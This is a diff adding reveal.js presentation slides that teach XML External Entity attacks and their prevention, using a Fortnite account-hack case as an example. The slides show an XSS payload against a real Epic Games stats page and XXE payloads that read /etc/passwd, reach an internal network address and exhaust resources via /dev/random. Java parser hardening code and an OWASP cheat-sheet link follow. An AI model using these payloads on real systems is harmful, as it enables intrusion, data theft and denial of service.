@@ -24,8 +24,133 @@
 	<body>
 		<div class="reveal">
 			<div class="slides">
-				<section>Slide 1</section>
-				<section>Slide 2</section>
+				<section>
+					<h2>A4 - XXE</h2>
+					<p>XML External Entities</p>
+				</section>
+				<section>
+					<section>
+						<h3>OWASP top 10 - A4</h3>
+						<img src="https://sdtimes.com/wp-content/uploads/2017/11/OWASP.png" />
+					</section>
+					<section>
+						<h3>Fortnite hack</h3>
+						<iframe width="560" height="315" src="https://www.youtube.com/embed/poQmRWWh45s" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+					</section>
+					<section>
+						<h3>How it works?</h3>
+						<img src="https://1.bp.blogspot.com/-oD_yxBQtVEU/XD8J1KCyatI/AAAAAAAAzBs/8K9wUZVEY_IiEWtUpoZPi01fzEyb20qFQCLcBGAs/s728-e100/fortnite-account-hacks.png" />
+					</section>
+					<section>
+							<ul>
+								<li>Crossside scripting (XSS)</li>
+								<li>Security Misconfiguration, Oauth takeover</li>
+							</ul>
+					</section>
+					<section>
+						<h3>Security Misconfiguration & Oauth takeover</h3>
+						<p>* only validated on *.epicgames.com</p>
+						<pre><code data-trim data-noescape>
+								https://accounts.epicgames.com/login?
+								productName=epic-games&
+								lang=en_US&
+								redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Fsite%2Fen-US%2Fhome&
+								client_id=[cliend_id]&
+								noHostRedirect=true
+						</code></pre>
+					</section>
+					<section>
+							<h3>Crossside scripting (XSS)</h3>
+							<pre><code data-trim data-noescape>
+									http://ut2004stats.epicgames.com/index.php?stats=maps&SearchName=”&gt;&lt;script%20src=[magiclinkhere]&gt;&lt;%2fscript&gt;
+							</code></pre>
+					</section>
+					<section>
+						<h3>Hackers look deeper</h3>
+						<img src="https://media.giphy.com/media/Gpf8A8aX2uWAg/giphy.gif" />
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>Xml External Entities</h2>
+					</section>
+					<section>
+						<h3>Senario 1:</h3>
+						<pre><code data-trim data-noescape>
+							&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+							&lt;!DOCTYPE foo [
+							&lt;!ELEMENT foo ANY &gt;
+							&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+							&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+						</code></pre>
+					</section>
+					<section>
+						<h3>Senario 2:</h3>
+						<p>* network aws 10.0.0.0 ;)</p>
+						<pre><code data-trim data-noescape>
+								&lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private&quot; &gt;]&gt;
+						</code></pre>
+					</section>
+					<section>
+						<h3>Senario 3:</h3>
+						<pre><code data-trim data-noescape>
+								&lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;
+						</code></pre>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h3>Hoe te voorkomen?</h3>
+						<quote>
+
+Java applications using XML libraries are particularly vulnerable to XXE because the default settings for most Java XML parsers is to have XXE enabled. To use these parsers safely, you have to explicitly disable XXE in the parser you use. The following describes how to disable XXE in the most commonly used XML parsers for Java.
+						</quote>
+					</section>
+					<section>
+						<h3> Java - XMLInputFactory (a StAX parser)</h3>
+						<pre><code data-trim data-noescape>
+							// This disables DTDs entirely for that factory
+							xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false); 
+							// disable external entities
+							xmlInputFactory.setProperty(&quot;javax.xml.stream.isSupportingExternalEntities&quot;, false); 
+						</code></pre>
+					</section>
+					<section>
+						<h3> Java - Schemafactory</h3>
+						<pre><code data-trim data-noescape>
+							SchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);
+							factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);
+							factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);
+							Schema schema = factory.newSchema(Source);
+						</code></pre>
+					</section>
+					<section>
+						<h3> Java - JAXB Unmarshaller</h3>
+						<pre><code data-trim data-noescape>
+								//Disable XXE
+								SAXParserFactory spf = SAXParserFactory.newInstance();
+								spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+								spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+								spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);
+								
+								//Do unmarshall operation
+								Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), 
+																new InputSource(new StringReader(xml)));
+								JAXBContext jc = JAXBContext.newInstance(Object.class);
+								Unmarshaller um = jc.createUnmarshaller();
+								um.unmarshal(xmlSource);
+						</code></pre>
+					</section>
+
+					<section>
+						Prevention Cheat Sheet:
+						<a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md">Prevention Cheat Sheet</a>
+					</section>
+				</section>
+				<section>
+					<h3>Demo</h3>
+					<img src="https://media.giphy.com/media/xT9KVqOt8xuRYhNpq8/giphy.gif" />
+				</section>
 			</div>
 		</div>
 
